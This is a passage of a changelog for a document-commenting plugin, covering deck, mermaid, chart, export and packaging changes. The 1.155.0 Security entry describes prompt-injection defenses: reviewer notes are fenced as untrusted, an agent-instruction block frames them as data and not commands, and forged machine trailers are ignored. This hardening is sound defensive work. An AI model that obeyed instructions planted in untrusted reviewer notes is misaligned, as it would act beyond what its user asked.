  (`display:none`) at load now re-renders at its real column width the moment its section is revealed,
  instead of staying blurry until the next window resize (CMH-CHART-09). While collapsed the canvas
  reads `clientWidth` 0 and draws its bitmap to the width fallback (the `width` attribute, else 760),
  so it was sized for the wrong width; a reveal `ResizeObserver` on each chart canvas re-draws it once
  on the transition from zero-size to visible (mirroring the Mermaid width-class observer from
  CMH-MMD-07). It is a one-shot reveal hook, not a perpetual size mirror, so a standalone
  `canvas.cmh-chart` in a shrink-to-fit container on a HiDPI screen cannot keep enlarging its own
  bitmap; genuine window resizes stay handled by the existing resize listener. This is the same
  render-while-hidden class as #430 (Mermaid).
- Pinned that code/KQL line-number gutters stay aligned when a collapsed section is revealed
  (CMH-CODE-06). Unlike the canvas chart above, the gutter needs no reveal recompute: the browser
  resolves a numeric `line-height` to a px value via `getComputedStyle` even for a `display:none`
  block, so the gutter offsets laid down while collapsed already match the visible line-height after
  reveal. A regression test locks that invariant in.

## [1.180.0] - 2026-07-20

### Changed

- The comments sidebar `Hide` button is now accent-tinted (an accent-soft background with accent text
  and border, and a solid-accent hover) so it stands out clearly and reads as distinct from the neutral
  `Help & About` button beside it (CMH-SIDE-09).

### Added

- The overflow (`...`) menu header now shows the running layer version (`v<version>`) between the
  portability badge and the brand icon; the version is decorative text and does not change the menu
  button tab order (CMH-MENU-ICON-03).

## [1.178.0] - 2026-07-20

### Added

- Deck mode now accepts `Backspace` as a "previous slide" key, alongside `ArrowLeft` and `PageUp`, so
  presenters can step one slide back with the key many slide tools use (CMH-DECK-05). It respects the
  same guards as the other navigation keys: it does not move slides while a comment field or other
  editable target is focused, or while the comment-options menu or other blocking deck chrome is open.
  Because `Backspace` uniquely carries a legacy browser "history back" default, the deck suppresses that
  default whenever it owns the key (including at the first-slide boundary, where the step back is a
  no-op) so a viewer is never navigated away from the deck.

## [1.175.0] - 2026-07-19

### Fixed

- `tools/authoring/upgrade.py` now re-emits the shell-baked mermaid loader bootstrap from the template,
  so the deck label fix (CMH-MMD-08) and any future change to the loader in
  `assets/template.shell.html` reach already-generated documents on upgrade (CMH-MMD-09). The bootstrap
  is baked into the document `<head>` at scaffold time, OUTSIDE the swappable CSS / COMMENT UI / JS
  regions, so a region swap alone never touched it: a deck generated before CMH-MMD-08 kept its old
  bootstrap after an upgrade and its mermaid labels still clipped. The swap replaces the `<head>`
  `<script type="module">` mermaid loader (and its `<!-- Mermaid loader -->` comment); it is scoped to
  `<head>` so authored body/CONTENT can never be mistaken for the loader, identifies the loader by a
  mermaid `import("...mermaid...")` so loaders predating the `pre.mermaid, div.mermaid` guard match
  too, preserves a hand-vendored offline loader (a local/relative mermaid import; a protocol-relative
  `//host` import counts as remote) rather than re-pointing it at the CDN, is document-kind-agnostic
  (the `.deck-stage` gate is a runtime check, so a non-deck report keeps HTML labels) and idempotent,
  and `--check` now flags a stale bootstrap. The Export Offline re-init is not shell-baked (it lives in
  the swapped JS region) and was already refreshed by the JS swap.

## [1.174.0] - 2026-07-19

### Changed

- Deck mermaid diagrams now scale to fill the available slide AREA using both width and height
  (contain-to-fit), not just the width (CMH-DECK-35, building on CMH-DECK-26), and are bounded to the
  slide so they never overflow or clip (even when nested in wrappers). A slide whose only non-text
  content is a single diagram and that is not laid out as a `.cmh-cols-2` is auto-detected as a diagram
  slide (`cmh-deck-diagram-slide`) and laid out as a flex column, and the runtime sizes the rendered
  SVG to the largest aspect-preserving box that fits the slide's fixed content area. A slide the author
  laid out as two columns keeps that layout - the automatic rule never flattens a `.cmh-cols-2`; the
  opt-in `.cmh-slide-diagram` recipe forces the fill and un-confines a lone diagram from its half column
  to the full slide width. The fit recomputes on resize and on slide activation, composes with
  CMH-MMD-08 (`htmlLabels: false`) so labels stay crisp, and survives Export Offline.

## [1.172.0] - 2026-07-19

### Fixed

- Deck mermaid node/edge labels no longer clip mid-word (CMH-MMD-08). A deck renders its slides inside
  a CSS-scaled 1920x1080 stage, and mermaid's default HTML (`<foreignObject>`) labels are re-laid-out
  by the browser against that scale, so a node box sized from the unscaled measurement is too small and
  wider labels (for example `You comment on the exact spot`) were cut off. On a deck the mermaid loader
  now initializes with `htmlLabels: false`, rendering labels as SVG `<text>` that scales with the
  diagram and never re-flows, so every label stays fully visible inside its node box. Reports keep the
  richer HTML labels. The same choice is applied by the live loader and the Export Offline re-init.
- Deck mermaid comment labels keep the space at a wrapped-line boundary. mermaid splits an SVG `<text>`
  label into per-line `tspan` rows with no separator, so the anchor key, comment quote, and Copy all
  had dropped the wrap-point space (`exact spot` -> `exactspot`); `mermaidNodeLabel()` now rejoins the
  rows with a space.

## [1.171.0] - 2026-07-19

### Added

- Link handling for author-facing references (CMH-LINK-01..04): at render time every external
  `<a href>` in the document is stamped `target="_blank"` + `rel="noopener noreferrer"` so a
  reference opens in a new tab and the reader keeps their place (same-page `#` fragments, `.cm-skip`
  UI chrome, and `javascript:` links are left untouched, and an author-set `target` is respected).
  Each link is now commentable like an image or mermaid node: hovering or keyboard-focusing a link
  reveals a floating `Add Comment` affordance that anchors an `anchorType: "link"` comment to that
  link (by index + href/text) without navigating - a normal click (or Enter) still follows the link,
  while the floating button or the non-navigating `Alt+Enter` chord opens the composer. Links are
  classified by their normalized protocol (only `http`/`https`/`file`), so control-char-obfuscated
  `javascript:`, `mailto:`/`tel:`, and `data:` links are never stamped or made commentable, and the
  `_blank` rel-enforcement is case-insensitive (reverse-tabnabbing defense). Link comments ring the
  link, list a card, flash on jump, and survive reload, Copy all, Export Markdown, and Export Offline.

## [1.170.0] - 2026-07-19

### Changed

- Deck comment-scope menu now stacks its options vertically with "Comment on deck" above
  "Comment on slide" (CMH-DECK-34).
- In deck mode a plain click on EMPTY slide space advances to the next slide in BOTH present and
  review-panel-open modes; a click on text (or any interactive target) never advances, so text
  stays selectable for commenting. "Empty" is decided by hit-testing the click POINT against the
  slide's text rects, so a wrapper/slide carrying loose text no longer blocks advancing, and a
  keyboard activation of a focused control never advances (CMH-DECK-31).
- Saved text highlights and the composing preview both paint a band slightly shorter than the line
  box (zero horizontal padding, no reflow), so a highlight that wraps across two lines now shows
  visible vertical spacing between the lines (CMH-SEL-02).
- Deck pills lift on hover: the reusable `.cmh-pill` recipe gains a hover-lift for all decks
  (CMH-DECK-RECIPE-05), and the showcase byline pills lift on hover (CMH-DECK-SHOWCASE-16).

### Showcase deck

- Refreshed the title and Act 1 promise copy: the title reads "Plan with AI, visually rich review
  inline, repeat.", the Act 1 paragraph is rephrased, the redundant "reviewed end to end" pill is
  removed, and the "Copy all" control is emphasized in its pill (CMH-DECK-SHOWCASE-13).
- The Chat / Markdown / HTML comparison table now marks the Commentable HTML row's winning cells
  with a distinct green fill and check glyph so the differentiators stand out (CMH-DECK-SHOWCASE-14).
- The title slide embeds a real screenshot of a document with selected text and the Add-comment
  popup, so the review workflow is visible up front (CMH-DECK-SHOWCASE-15).
- The top-right site logo sits further into the corner and its tooltip reads just "Commentable
  HTML" (CMH-DECK-SHOWCASE-10).

## [1.169.0] - 2026-07-19

### Added

- Code blocks can carry an optional filename/description caption line: add `data-code-caption` to a
  `<pre>` (for example `data-code-caption="trigger.kql"`) and the runtime renders a `cm-skip`,
  non-selectable caption bar above the code, laid out like the KQL caption bar (filename on the left,
  the language pill and Copy button inline on the right) so no language-label width overlaps the
  filename. It is styled consistently in report and deck modes, leaves the language pill, Copy
  button, syntax highlighting, and commenting on the code intact (a caption-crossing drag cannot
  leak the filename into a comment's quote), never doubles a KQL figure's own caption, and survives
  Export Offline (the caption re-renders from the surviving attribute on reopen). (CMH-CODE-05)

## [1.168.0] - 2026-07-19

### Changed

- The validator now ERRORS in NonPortable mode when a baked absolute or `file://` companion
  reference resolves inside an OS temporary directory that is not the document's own folder
  (CMH-VAL-16). Such a document validates clean at creation but silently loses its whole comment
  layer once the OS reaps the temp directory - the exact failure behind a shared document whose
  CSS/JS 404'd after handoff. Temp detection is cross-platform and root-anchored (`TMPDIR`/`TEMP`/
  `TMP` and `tempfile.gettempdir()`, symlink-resolved via `realpath`, plus `/tmp`, `/var/tmp`,
  `/var/folders`, `/windows/temp`, and per-user `AppData/Local/Temp`), so a durable project folder
  named `tmp` is never mis-flagged; relative refs and a companion sitting beside the document are
  never flagged. The message points at a Portable single-file export or copying `dist/` to a
  durable folder.

## [1.167.0] - 2026-07-19

### Added

- Preview highlight while composing a text comment (CMH-CORE-17): opening a new text-comment
  composer immediately shows the selected text as a live amber preview highlight
  (`mark.cm-preview`) so the reviewer sees exactly what the comment will anchor to. Saving turns
  it into the real persisted highlight over exactly the previewed text; cancelling via the Cancel
  button or Escape removes it and stores nothing. The preview is transient chrome (no `data-cid`,
  never persisted, excluded from export and print), stays in the text-offset space so a concurrent
  composer's anchors never cross, is fully cleaned up if wrapping throws, and is re-applied if a
  save cannot complete so the still-open composer keeps its anchor cue.

## [1.166.0] - 2026-07-19

### Added

- CMH-ASCII-01: the document producers now rewrite AI "smart" typography - em/en dashes, the
  ellipsis glyph, curly quotes, and non-breaking / zero-width spaces - to plain ASCII in visible
  prose, leaving code, script, style, and HTML comments verbatim. `finalize.py` (reports/plans) and
  `deck_scaffold.py` (deck slide prose) run the new shared `normalize_typography.py` normalizer by
  default; opt out with `--no-normalize`. This keeps every report, plan, and deck on the plain-ASCII
  house style without a hand pass.

### Changed

- Deck hover is smoother (CMH-DECK-21, CMH-DECK-RECIPE-02): table-cell, metric-tile, and
  reference-pill hovers no longer animate `box-shadow` (a per-frame repaint) and table cells no
  longer apply a `transform` lift (which relayouts the table). Cells ease only the cheap
  `background-color` and the highlight ring snaps; tiles and pills keep their lift via the
  compositor-friendly `transform`. Sweeping the mouse across a large deck table no longer lags.

## [1.165.0] - 2026-07-19

### Added

- Third-party MIT license notices for the vendored rich-content libraries (mermaid, Chart.js). The
  upstream license texts are vendored under `dev/assets/vendor/*.LICENSE`, `build.py` assembles them
  into a shipped `THIRD_PARTY_NOTICES.md` (copied unzipped beside the plugin LICENSE and gated by
  `build.py --check`), and `Export Offline` now embeds each bundled library's MIT notice as an HTML
  comment beside the inlined library, so a redistributed offline artifact carries the required
  copyright and permission notice.

## [1.163.0] - 2026-07-19

### Changed

- Documented the online mermaid CDN import as a by-design accepted supply-chain risk (CMH-SEC-04):
  the runtime loads mermaid from a version-pinned jsDelivr URL (single-sourced from the mermaid
  dependency), with a zero-network vendored fallback via Export Offline. Credited the third-party
  rich-content libraries the plugin renders with - mermaid and Chart.js, both MIT - in the plugin
  README, the marketplace README, the site plugin page, and the vendored-libraries provenance doc.

## [1.162.0] - 2026-07-19

### Added

- Deck comment scoping: an empty right-click on a slide now offers BOTH "Comment on slide" (a comment
  tied to that specific slide, whose sidebar card names the slide and whose jump navigates to it) and
  "Comment on deck" (the deck-wide comment, the relabelled document-wide comment). (CMH-DECK-33)
- Deck click-to-advance: in present mode (comment panel closed), a plain left-click on non-interactive
  slide content advances to the next slide; links, buttons, form controls, comment anchors, and deck
  chrome keep their own behavior, and the open review panel is never yanked forward. (CMH-DECK-31)

### Changed

- Deck edge navigation arrows now reveal across a wide left/right hover band (not only a thin edge
  strip), stay reliably visible, and are a larger, comfortably clickable target. (CMH-DECK-32)

## [1.161.0] - 2026-07-19

### Added

- Deck layer recipe classes so a themed deck needs no per-deck CSS for common needs (CMH-DECK-RECIPE-01/02/03/04):
  - Status-pill variants `.cmh-pill.is-available` (green), `.is-wip` (amber), `.is-planned` (slate), each with white text at AA contrast.
  - Metric tiles (`.cmh-metric`) hover-lift, and the metric value is capped at a fixed stage size with `overflow-wrap: break-word` so long word-labels no longer overflow the card.
  - A reference-row recipe (`.cmh-refs` + `.cmh-refs-label`) that renders reference links as a horizontal row of pills; on a `.cmh-slide-flow` flex-column content slide its `margin-top: auto` pins the row to the bottom of the fixed slide box.
  - Deck-scoped default prose spacing (paragraphs collapse their top margin, list items gain bottom spacing, lists get a 1.5 line-height) so a deck reads as spaced bullets-over-prose without per-deck CSS; non-deck documents are unaffected.
- `deck_validate.py` now also gates the reference-pill contrast pair (`--slide-link` over `--cmh-deck-code-bg`), so a custom theme cannot ship low-contrast reference links.

## [1.160.1] - 2026-07-19

### Security

- Source provenance now stores only the source filename in `data-doc-source`, Copy all, and every
  preserved export. Authoring tools and runtime fallbacks strip directories, drive letters,
  usernames, and internal project paths while leaving the document comment key, session id, and
  generated timestamp unchanged (CMH-SEC-03, part of #438).

## [1.160.0] - 2026-07-19

### Added

- The deck slide-overview navigator now has a search box at the top that filters the slide list by
  title as you type; keyboard navigation and the count follow the filter, and reopening the overview
  resets it (CMH-DECK-30).
- Clicking the "Open comment" hover bubble now also opens an inline on-screen comment dialog next to
  the highlight, showing the note and an Edit button that opens the composer; clicking elsewhere closes
  the dialog, and a pointer click there is swallowed so it performs no other action (for example it does
  not follow a link the highlight sits on) while a keyboard activation still reaches its target. The
  existing sidebar jump still happens alongside it (CMH-CORE-16, closes #450).

## [1.159.0] - 2026-07-19

### Changed

- Section review now stays out of the way until you start reviewing: the per-section review badges
  and the side table-of-contents review-status filter are dormant on a freshly opened document and
  activate only after you mark a section reviewed or add the first comment (the hover "Mark reviewed"
  affordance on any heading remains available as the entry point). Each side-TOC entry now shows a
  single-character status badge - R (reviewed), C (commented), ! (changed), or a hollow badge for
  unreviewed - rendered as a pseudo-element so it never pollutes the entry text. The reviewed state
  continues to bake into Portable and Offline exports and now re-activates the review UI when an
  exported file is reopened. Export also prunes markers for headings that no longer exist, so a shared
  copy never carries stale review metadata for a removed section.

## [1.158.0] - 2026-07-19

### Fixed

- A Mermaid diagram authored inside a collapsible section that is collapsed (`display:none`) at load
  no longer renders as a tiny, broken graph. Drawing a diagram in place with `mermaid.run()` while its
  container has a zero-size box produced a degenerate `~16px` viewBox with the nodes stacked on top of
  each other, and mermaid never re-measured it, so it stayed broken once the section was revealed. The
  loader now renders each hidden diagram by running mermaid on an OFF-SCREEN CLONE (a `1000px`
  sandbox) and moving the rendered SVG into the real element - reusing mermaid's own source extraction
  (so `<br/>` labels and entities match a visible diagram) and error handling (a malformed diagram
  leaves no stray SVG in the page). Every diagram is therefore laid out correctly at load - correct the
  moment its section is revealed and also correct if the collapsed section is printed. Renders are
  serialized so rendering many diagrams at once cannot corrupt them, and one malformed diagram does not
  starve its siblings (CMH-MMD-07). Deck slides (hidden with `visibility:hidden`, not `display:none`)
  keep their existing eager render. On reveal the wide/scroll-fade classification is recomputed against
  the diagram's now-real container width, and the loader exposes `window.__cmhMermaidReady` for
  print/screenshot automation. The Export Offline vendored-inline re-init carries the same logic, so
  offline-exported reports render collapsed-section diagrams correctly with zero network.

## [1.157.0] - 2026-07-19

### Fixed

- The `upgrade.py` and `retrofit.py` authoring tools now preserve the input file's dominant newline
  (detected from the raw bytes) through the transform, so a Windows-authored (CRLF) portable or host
  HTML file is no longer silently normalized to LF on upgrade/retrofit (CMH-TOOL-08, CMH-TOOL-15,
  closes #437).

### Changed

- The shipped `pkg/` root now carries its own `LICENSE` (matching the repository root LICENSE) so the
  always-shipped session hooks are covered by a license even before `skill-resources.zip` is
  extracted (CMH-PKG-13).

## [1.156.0] - 2026-07-18

### Security

- PPTX deck imports now preflight ZIP central-directory metadata before starting the vendored
  extractor, rejecting archives with excessive expanded size, entry count, or compression ratio
  to prevent zip-bomb memory exhaustion (CMH-DECK-29, closes #410).

## [1.155.0] - 2026-07-19

### Security

- Copy all agent bundle: hardened against untrusted-document / prompt-injection. Each free-text
  reviewer note is now wrapped verbatim in a dynamic, tilde-sized `UNTRUSTED REVIEWER NOTE` fence
  (sized longer than any tilde run in the note), and a read-first AGENT INSTRUCTIONS block frames
  reviewer notes as untrusted, document-scoped change requests the agent may act on only as edits to
  the document under review - as data, never as agent or system instructions, and never as a trigger
  for tool use beyond the documented handled-id update (CMH-COPY-08). The document `data-doc-source`
  is emitted single-line so an embedded newline cannot forge a standalone machine line (CMH-COPY-08).
- Copy all machine trailer: all machine-readable JSON (`HANDLED_IDS_JSON`, `NOTES_STATE_JSON`,
  `CHECKLIST_STATE_JSON`) now lives only inside ONE unconditional final
  `=== CMH MACHINE TRAILER (do not edit) ===` block (canonical empty values when there are no
  changes). The `notes_apply.py`, `checklist_apply.py`, and `mark_handled.py` tools read JSON only
  from within that fenced trailer, so a forged trailer or state line inside a note body or the
  document source is ignored rather than winning a last-match over the whole bundle (CMH-COPY-09,
  CMH-HANDLED-01).

## [1.154.0] - 2026-07-18

### Security

- Checklist and notes state maps (`_clOverrides`, the `::cl` save/load maps, `_noteOverrides`) are
  now built with `Object.create(null)` at every assignment site; `_clLoad` additionally re-homes
  the parsed outer map and each per-checklist inner map onto a null-prototype copy before reading
  them, and the checklist token lookup uses a `hasOwnProperty` guard. As a result, a checklist
  authored with `data-cmh-checklist="__proto__"`/`"constructor"` (or a crafted `::cl` localStorage
  payload using `__proto__`/`constructor` keys or codes) can no longer write onto or return
  `Object.prototype`. A checklist id or item key of `constructor`/`__proto__` still works as
  ordinary data; no behavior changed for legitimate documents (CMH-SEC-02).

## [1.153.0] - 2026-07-18

### Added

- Section review tracking: hover or keyboard-focus any heading (h1-h6) to mark that section
  reviewed. A badge to the right of the title shows one of four states - Reviewed (green),
  Changed - re-review (amber, when the section content changed since it was reviewed), Commented
  (blue, when the section has an open comment), or unreviewed. Change detection uses a deterministic
  content hash of the section (heading to the next same-or-higher heading, excluding runtime chrome);
  a one-click re-review on a Changed/Commented badge re-stamps it. The side table-of-contents gains a
  per-entry state dot and an All / Reviewed / Unreviewed / Commented / Changed filter that collapses
  the sections it hides. Markers persist in localStorage (with tombstones for cleared baked markers)
  and bake into Portable/Offline exports via a dedicated `reviewedSections` block (kept out of the
  Copy-all bundle; stripped from Plain export). New `tools/authoring/mark_reviewed.py` bakes markers
  from the CLI, and `section_hash.py` shares the byte-identical hash contract with the runtime
  (pinned equal by a JS/Python golden and an end-to-end extractor-parity test).

## [1.149.0] - 2026-07-18

### Security

- Bounded `mergeCommentSets()` against a pathological `embeddedComments` array or a
  poisoned cross-document `localStorage` array under a matching `data-comment-key`:
  the merged comment count is now capped at a generous `CMH_MAX_COMMENTS` bound, and
  any comment whose `start`/`end` is present but not a finite, non-negative, ordered,
  in-range offset is dropped, so startup's `backfillContext()`/`restoreHighlights()`
  per-comment document walk can no longer be driven into unbounded
  O(comment_count x document_size) work by untrusted input. Normal documents with
  realistic comment counts and offsets are unaffected (CMH-PERSIST-04).

## [1.145.0] - 2026-07-18

### Changed

- Deck comment-options menu (all decks): the menu surface is now a 3-state RADIO GROUP of mutually
  exclusive options - `Comments off`, `Comments on, panel closed`, and `Comments on, panel open` -
  of which exactly one is selected (`menuitemradio`, `aria-checked`), so choosing one is clearly a
  single pick rather than a set of independent toggles. `Comments off` stays disabled while any
  comment exists (so feedback is never stranded), the site link remains a menu item, and full
  keyboard navigation is preserved (opening focuses the checked option) (CMH-DECK-11).
- The showcase deck's top-right brand mark is now the official Commentable HTML logo rendered as a
  plain image (an inlined, offline-safe `data:` SVG) instead of a bordered card with a hand-drawn
  glyph; it still links to the project site with a clear tooltip (CMH-DECK-SHOWCASE-10).

## [1.144.0] - 2026-07-18

### Changed

- Decks now show a dismissible "Best viewed in landscape" hint on narrow portrait phones only, leaving landscape and non-deck documents unchanged (CMH-DECK-28).
- The comments sidebar now uses one Export menu for Portable, Offline, Markdown, and Plain HTML actions instead of four always-visible export buttons, while keeping the same export handlers and downloads (CMH-EXP-13).
- Mobile mermaid diagrams now use a width-based classifier: small diagrams fit the viewport, genuinely wide diagrams keep a scrollable min-width, and overflowing diagrams show an edge-fade cue (CMH-RESP-09).

## [1.143.0] - 2026-07-17

### Changed

- Redesigned the deck comment-mode control into a 3-state selector persisted per-deck. The corner brand icon now opens a small menu with three states: comments on with the panel closed (the new default, so a reviewer can select text / right-click and Add Comment on any slide without first entering a mode), comments on with the review panel open, and commenting disabled (present-only). "Disable commenting" is only offered when the deck has zero comments, so existing feedback can never be stranded. Adding a comment or opening the panel keeps the persisted state in step. The corner icon now keeps a legible surface background in every state (the old accent-filled "on" state hid the accent-coloured icon), and a small caret marks it as a menu (CMH-DECK-11, CMH-DECK-25). This single menu control supersedes the separate comment-mode toggle and brand link from 1.142.0, so the distinct-toggle-icons behaviour (was CMH-DECK-23) is removed with its test.
- Replaced the deck slide-overview thumbnail grid with a readable numbered list of slide titles (the 1920x1080-to-chip thumbnails were unreadable and rendered canvas/hero content as black blocks) (CMH-DECK-16). This retires the overview thumbnail-snapshot behaviour (was CMH-DECK-24) with its test, since there are no longer any thumbnails to render.
- Deck Mermaid diagrams now scale to fill the slide width instead of rendering at a tiny intrinsic size with a large empty band, and sortable-table sort chevrons on a coloured deck header now use the header foreground colour so they stay legible (CMH-DECK-26, CMH-DECK-27).
- Showcase deck polish: slide content is vertically centered to use the full stage (less bottom whitespace), the amber title highlight now hugs the letters instead of bleeding into the line above, and every slide carries a Commentable HTML brand mark at its top-right linking to the plugin site (CMH-DECK-SHOWCASE-10, CMH-DECK-SHOWCASE-11, CMH-DECK-SHOWCASE-12).

## [1.142.0] - 2026-07-17

### Changed

- Mobile and chrome polish from a full visual audit of the example set (the new `.github/skills/visual-audit` skill drove every example in desktop and mobile viewports; issue #353). On narrow viewports a page title flush to the top no longer renders under the fixed toolbar pill (CMH-RESP-03), the comments sidebar opens as a full-width sheet with the resize handle removed so no document sliver shows behind it (CMH-RESP-04), and the floating scroll-progress bubble is hidden so it never overlaps content (CMH-RESP-05). The compact checklist state control gains a `>=44px` invisible touch target without enlarging its glyph (CMH-RESP-06). The control that reopens the comments panel is now labeled `Comments` instead of the ambiguous `Show` that duplicated the top-bar pill (CMH-CHROME-11), and a disabled deck navigation button keeps a readable contrast instead of near-invisible gray (CMH-DECK-NAV-01).
- Follow-up polish from the visual audit (issue #360), each with a covering test in `tests/72-followups.spec.js`:
  - A leading lede/card (not just a bare title) also clears the fixed toolbar on mobile (CMH-RESP-03).
  - The notes fold/toggle controls and the sidebar comment-card action buttons (jump/edit/delete) get `>=44px` touch targets on mobile without changing their look (CMH-RESP-07). Dense checklist rows also keep enough vertical rhythm (table rows via `td` padding) that adjacent tap targets never overlap into a neighbouring row (CMH-RESP-06).
  - Small charts fit the mobile viewport instead of being force-widened to 560px, which had clipped pie/doughnut legends; wide mermaid diagrams still scroll (CMH-RESP-08).
- `report-checklist` no longer repeats its document title verbatim as its first section heading; the first section is now `About this example`, so the sidebar breadcrumb is not doubled (CMH-CONTENT-17).

### Fixed

- The sidebar/Copy-all context preview no longer glues adjacent elements into a run-on ("18open incidents"): it inserts a separator at non-inline box boundaries. Display-only - the comment-anchoring offset space is unchanged (CMH-CTX-01).
- The deck comment-mode toggle now uses a distinct annotate icon instead of the brand speech-bubble the site link uses, so the two top-corner controls are no longer identical (CMH-DECK-11, CMH-DECK-23).
- The deck overview grid renders faithful thumbnails: slide canvases are snapshotted into images (a cloned canvas is blank), and each cloned SVG's ids are namespaced per clone (with `url(#id)`, `href`, and aria idref references rewritten) so a thumbnail's gradient/mask/filter refs resolve to its OWN defs - fixing the slide-1 logo rendering black, without duplicating a document id when two slides reuse the same id (CMH-DECK-24).

## [1.141.0] - 2026-07-17

### Changed

- `tools/authoring/upgrade.py` now restamps the `<head>` `<meta name="commentable-html-version">` to the template's runtime version during an upgrade (inserting it when a pre-version legacy document lacks it), so an upgraded document no longer self-reports the old version while running the new runtime. The restamp is scoped to `<head>`, so the marker-like JS export regex literal (`content="[^"]+"`) is never matched or rewritten. Post-upgrade validator warnings are now surfaced instead of discarded, and a new opt-in `--strict` flag treats them as a failure (leaving the target unchanged and exiting non-zero); the default still commits so a version-only upgrade is never blocked by a pre-existing content warning (CMH-TOOL-08, closes #359).

## [1.140.0] - 2026-07-17

### Fixed

- Made the vendored rich-libraries blob (the inline gzip+base64 mermaid/Chart.js payload) reproducible across zlib implementations. `build.py` previously gzipped the libraries live via `deterministic_gzip`, but gzip DEFLATE output is not identical between stock zlib and zlib-ng (which Python 3.14 ships), so a dist built on Python 3.14 produced a different blob than CI's stock-zlib build and failed the required `dist-in-sync`/`plugin-tests` checks with no source change. The build now reads a committed `assets/vendor/<lib>.gz` artifact and only base64-encodes it (deterministic on every machine); `build.py --regen-vendor-gz` regenerates those artifacts when a vendored library changes, and `build.py --check` verifies each committed `.gz` decompresses to the current source (decompression is deterministic across zlib impls, so the guard never recompresses) (CMH-BUILD-11, closes #372).

## [1.139.0] - 2026-07-17

### Changed

- Ship the skill as a compact `skills/commentable-html/skill-resources.zip` (only `SKILL.md`,
  `LICENSE`, and the zip in the shipped skill dir) that a SessionStart hook unpacks on first run per
  version. This drastically cuts the number of files the plugin installer writes, working around the
  Windows Defender install failure (`Access is denied. (os error 5)`) where the installer aborts on
  the first transiently locked file - the extractor retries each member with backoff, which the
  installer does not. An update ships a new zip and self-heals on the next session (the version
  marker invalidates), which largely fixes the auto-updater silently never updating on Defender
  machines: it now rewrites just the one zip instead of ~178 files, shrinking the transient-lock
  surface dramatically (a lock on that single file is still possible and simply retries next
  session). The large tutorial (`docs/`) and worked examples (`examples/`) are no longer installed;
  they moved to the plugin top level and are linked online. `build.py` gains `--pkg-dir` /
  `--examples-dir` and assembles the deterministic zip, and the editable + built skill tree now
  lives under `dev/skill/`.

### Fixed

- Harden the first-run extractor and packager (review round): the extractor now refuses to write the
  success marker for a zip that carries no installable runtime directory (a truncated/empty/wrong
  zip self-heals next session instead of caching a broken install); a fully-successful swap that
  then hits a locked orphan backup still writes the marker (the backup is reclaimed next run rather
  than forcing a needless re-extract); `_make_writable` restores the directory execute bit on POSIX
  (not `S_IWRITE` only) so a cleared-bit tree can still be removed; and its NTFS retry set is pinned
  (`WinError 5/32/33/145`). The packager now fails the build if any required runtime dir is missing
  or empty, and `--check` flags a duplicated zip member (which a name-to-bytes map would silently
  collapse). The Windows launcher's `$PSScriptRoot` anchoring and the `-c pass` interpreter probe
  are pinned by tests, plus a Windows-junction packager-guard test.
- Round-7 review hardening: the version-marker fast path now tests for a real FILE (`isfile`, not
  `exists`) and `clear_markers` removes a marker-named directory, so a directory that somehow shares
  the marker name can no longer permanently skip extraction or block the marker write. Added tests
  pin the orphan-backup-cleanup survival, the rename-aside rollback branch, absolute/drive-letter
  zip-member rejection, the stale-lock sidecar cleanup, `.ok.tmp` cleanup, deterministic-zip
  host-neutral metadata, and text LF-normalization.
- Round-8 review hardening: the hook HOT-PATH marker check is now FILE-specific (bash `-f`, PowerShell
  `-PathType Leaf`) so a marker-named directory cannot short-circuit the launcher before Python and
  suppress extraction (previously the `isfile` guard in run() was unreachable behind the launchers'
  `-e`/`Test-Path`). Cleanup now unlinks a symlink/junction as itself instead of following a reparse
  point into its target (os.path.islink misses Windows junctions; matters on Python < 3.12). An
  in-place upgrade prunes the obsolete `docs/` and `examples/` dirs the package no longer ships so the
  runtime converges to the minimal tree. The packager fails closed if a required shipped file
  (`SKILL.md`/`LICENSE`) is missing from the stage. Added tests execute the shipped bash hook commands
  end-to-end (cold/warm/marker-dir) and pin the junction cleanup, the legacy prune, and the missing-file
  guards.
- Round-9 review hardening (junction/reparse robustness): `_make_writable` now prunes reparse points
  from its `os.walk` in place so it never DESCENDS into a junction's external target (a bare `continue`
  did not stop the walk); cleanup/swap use `os.path.lexists` so a BROKEN junction (which `os.path.exists`
  and `os.path.islink` both miss) is detected and removed instead of causing a later `os.replace` to
  fail with WinError 5; and the marker temp file is pid-unique so a leftover locked `.tmp` cannot block
  the marker write. Added tests: no-descend-into-junction, broken-junction removal, pid-suffixed `.tmp`
  cleanup, an executable PowerShell-launcher smoke test (cold/marker-dir), and a canary proving the warm
  hot path spawns no Python. Repointed remaining stale pre-relocation doc paths.
- Round-10 review hardening: cleanup now unlinks a junction NESTED inside a directory being removed
  before calling `shutil.rmtree`, so rmtree can never traverse a nested junction into its external
  target (Python < 3.12 lacked that protection - bpo-31818); a test pins it. Fixed the `.githooks/pre-push`
  layer-dist check, which still targeted the pre-relocation `--out-dir` and always failed; made the
  `40-package.py` build part self-contained (explicit `os`/`re` imports); and added a plugin-level
  `.gitignore` so the extractor unpacking into the source tree during local testing can never stage a
  polluted (non-minimal) shipped skill dir.
- Round-11 review hardening: made the nested-junction protection robust to an unlink FAILURE.
  `_prune_nested_reparse` now returns whether the tree is truly free of nested reparse points, and its
  three callers only proceed to `shutil.rmtree` when it is - so a junction that could not be unlinked
  (e.g. a transient lock) makes the removal retry (or skip) instead of ever letting `shutil.rmtree`
  traverse the survivor into its external target on Python < 3.12. A mock-based test pins the
  unlink-failure path.
- Round-12 review hardening: `_prune_nested_reparse` also fails closed when `os.walk` cannot scan a
  subtree (a junction could hide there unseen) via an `onerror` callback, so `shutil.rmtree` never runs
  on an incompletely-inspected tree. And a crash-recovery backup restore that cannot complete now aborts
  the extraction rather than swallowing the error and then letting the swap delete the very backup it
  meant to keep, so the last-known-good backup survives for the next session. Tests pin both.

## [1.138.0] - 2026-07-17

### Changed

- Slimmed the shipped plugin payload and site skill ZIP by relocating the agent-only `bold-template-pack` reference material into `dev/vendor/frontend-slides/`. The shipped frontend-slides runtime assets and tooling remain in `pkg/`, while separate SHA-256 manifests now keep both vendor trees pristine (CMH-DECK-07, closes #341).

## [1.137.0] - 2026-07-17

### Added

- Two LIGHT native deck theme presets alongside the dark `terminal`: `paper` (warm-cream, editorial-serif, crimson accent) and `editorial` (soft-cream serif, deep-teal accent), each adapted from a frontend-slides `STYLE_PRESETS.md` style (credited via `adaptedFrom` + `sourceCommit`). Both override the full component token set (the defaults are dark) and pass `_deck_theme.load` (composited effective-contrast + opaque `contrastPairs` self-check at AA) and the objective `theme_eval` harness with no validator error, no clipping advisory, and a bounded byte delta (CMH-DECK-THEME-06, issue #343). Scaffold a themed deck with `deck_scaffold.py --theme paper` (or `editorial`, `terminal`).
